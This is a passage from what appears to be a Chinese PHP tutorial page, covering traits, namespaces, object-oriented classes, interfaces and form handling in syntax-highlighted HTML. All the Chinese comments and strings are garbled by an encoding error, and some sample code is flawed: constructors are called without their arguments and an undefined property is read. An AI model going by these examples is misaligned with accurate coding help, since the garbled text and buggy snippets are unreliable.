class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hello '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name-definition class-name">SayWorld</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'World!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">MyHelloWorld</span> <span class="token keyword">extends</span> <span class="token class-name">Base</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">SayWorld</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyHelloWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//namespace MyProject;</span><span class="token comment">//echo 'å‘½åç©ºé—´ä¸ºï¼š"', __NAMESPACE__, '"'; // è¾“å‡º "MyProject"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‘½åç©ºé—´"><a href="#å‘½åç©ºé—´" class="headerlink" title="å‘½åç©ºé—´"></a>å‘½åç©ºé—´</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">namespace</span> <span class="token package">MyProject</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">CONNECT_OK</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Connection</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span>  <span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">AnotherProject</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">CONNECT_OK</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Connection</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span>  <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é¢å‘å¯¹è±¡"><a href="#é¢å‘å¯¹è±¡" class="headerlink" title="é¢å‘å¯¹è±¡"></a>é¢å‘å¯¹è±¡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Site</span> <span class="token punctuation">{</span>    <span class="token comment">/* æˆå‘˜å˜é‡ */</span>    <span class="token keyword">var</span> <span class="token variable">$url</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$title</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span> <span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">title</span> <span class="token operator">=</span> <span class="token variable">$par2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">print</span> <span class="token string double-quoted-string">"é”€æ¯ "</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/* æˆå‘˜å‡½æ•° */</span>    <span class="token keyword">function</span> <span class="token function-definition function">setUrl</span><span class="token punctuation">(</span><span class="token variable">$par</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$par</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">url</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">setTitle</span><span class="token punctuation">(</span><span class="token variable">$par</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">title</span> <span class="token operator">=</span> <span class="token variable">$par</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">title</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$runoob</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Site</span><span class="token punctuation">;</span><span class="token variable">$taobao</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Site</span><span class="token punctuation">;</span><span class="token variable">$google</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Site</span><span class="token punctuation">;</span><span class="token comment">// è°ƒç”¨æˆå‘˜å‡½æ•°ï¼Œè®¾ç½®æ ‡é¢˜å’ŒURL</span><span class="token variable">$runoob</span><span class="token operator">-&gt;</span><span class="token function">setTitle</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"èœé¸Ÿæ•™ç¨‹"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$taobao</span><span class="token operator">-&gt;</span><span class="token function">setTitle</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"æ·˜å®"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$google</span><span class="token operator">-&gt;</span><span class="token function">setTitle</span><span class="token punctuation">(</span> <span class="token string double-quoted-string">"Google æœç´¢"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$runoob</span><span class="token operator">-&gt;</span><span class="token function">setUrl</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'www.runoob.com'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$taobao</span><span class="token operator">-&gt;</span><span class="token function">setUrl</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'www.taobao.com'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$google</span><span class="token operator">-&gt;</span><span class="token function">setUrl</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'www.google.com'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è°ƒç”¨æˆå‘˜å‡½æ•°ï¼Œè·å–æ ‡é¢˜å’ŒURL</span><span class="token variable">$runoob</span><span class="token operator">-&gt;</span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$taobao</span><span class="token operator">-&gt;</span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$google</span><span class="token operator">-&gt;</span><span class="token function">getTitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$runoob</span><span class="token operator">-&gt;</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$taobao</span><span class="token operator">-&gt;</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$google</span><span class="token operator">-&gt;</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å­ç±»æ‰©å±•ç«™ç‚¹ç±»åˆ«</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Child_Site</span> <span class="token keyword">extends</span> <span class="token class-name">Site</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$category</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">setCate</span><span class="token punctuation">(</span><span class="token variable">$par</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">category</span> <span class="token operator">=</span> <span class="token variable">$par</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">getCate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">category</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// å£°æ˜ä¸€ä¸ª'iTemplate'æ¥å£</span><span class="token keyword">interface</span> <span class="token class-name-definition class-name">iTemplate</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setVariable</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getHtml</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// å®ç°æ¥å£</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Template</span> <span class="token keyword">implements</span> <span class="token class-name">iTemplate</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setVariable</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">vars</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getHtml</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">vars</span> <span class="token keyword">as</span> <span class="token variable">$name</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$template</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'{'</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'}'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$template</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> <span class="token constant">constant</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'å¸¸é‡å€¼'</span><span class="token punctuation">;</span><span class="token comment">//å¦‚æœçˆ¶ç±»ä¸­çš„æ–¹æ³•è¢«å£°æ˜ä¸º finalï¼Œåˆ™å­ç±»æ— æ³•è¦†ç›–è¯¥æ–¹æ³•ã€‚å¦‚æœä¸€ä¸ªç±»è¢«å£°æ˜ä¸º finalï¼Œåˆ™ä¸èƒ½è¢«ç»§æ‰¿ã€‚</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">AbstractClass</span><span class="token punctuation">{</span>    <span class="token comment">// å¼ºåˆ¶è¦æ±‚å­ç±»å®šä¹‰è¿™äº›æ–¹æ³•</span>    <span class="token keyword">abstract</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">prefixValue</span><span class="token punctuation">(</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// æ™®é€šæ–¹æ³•ï¼ˆéæŠ½è±¡æ–¹æ³•ï¼‰</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">printOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">print</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ConcreteClass1</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractClass</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"ConcreteClass1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">prefixValue</span><span class="token punctuation">(</span><span class="token variable">$prefix</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$prefix</span><span class="token punctuation">}</span></span>ConcreteClass1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ConcreteClass2</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractClass</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"ConcreteClass2"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">prefixValue</span><span class="token punctuation">(</span><span class="token variable">$prefix</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$prefix</span><span class="token punctuation">}</span></span>ConcreteClass2"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$class1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteClass1</span><span class="token punctuation">;</span><span class="token variable">$class1</span><span class="token operator">-&gt;</span><span class="token function">printOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$class1</span><span class="token operator">-&gt;</span><span class="token function">prefixValue</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FOO_'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token variable">$class2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteClass2</span><span class="token punctuation">;</span><span class="token variable">$class2</span><span class="token operator">-&gt;</span><span class="token function">printOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$class2</span><span class="token operator">-&gt;</span><span class="token function">prefixValue</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FOO_'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¡¨å•"><a href="#è¡¨å•" class="headerlink" title="è¡¨å•"></a>è¡¨å•</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$q</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$q</span> <span class="token operator">==</span><span class="token string single-quoted-string">'RUNOOB'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'èœé¸Ÿæ•™ç¨‹&lt;br&gt;http://www.runoob.com'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$q</span> <span class="token operator">==</span><span class="token string single-quoted-string">'GOOGLE'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Google æœç´¢&lt;br&gt;http://www.google.com'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$q</span> <span class="token operator">==</span><span class="token string single-quoted-string">'TAOBAO'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æ·˜å®&lt;br&gt;http://www.taobao.com'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>RUNOOB<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>Runoob    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GOOGLE<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>Google    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TAOBAO<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>Taobao    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>æäº¤<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¡¨å•éªŒè¯"><a href="#è¡¨å•éªŒè¯" class="headerlink" title="è¡¨å•éªŒè¯"></a>è¡¨å•éªŒè¯</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">HTML</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>èœé¸Ÿæ•™ç¨‹(runoob.com)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.error</span> <span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span> #FF0000<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// å®šä¹‰å˜é‡å¹¶é»˜è®¤è®¾ç½®ä¸ºç©ºå€¼</span><span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token variable">$genderErr</span> <span class="token operator">=</span> <span class="token variable">$websiteErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$gender</span> <span class="token operator">=</span> <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token variable">$website</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"åå­—æ˜¯å¿…éœ€çš„"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// æ£€æµ‹åå­—æ˜¯å¦åªåŒ…å«å­—æ¯è·Ÿç©ºæ ¼</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^[a-zA-Z ]*$/"</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$nameErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"åªå…è®¸å­—æ¯å’Œç©ºæ ¼"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"é‚®ç®±æ˜¯å¿…éœ€çš„"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"email"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// æ£€æµ‹é‚®ç®±æ˜¯å¦åˆæ³•</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span 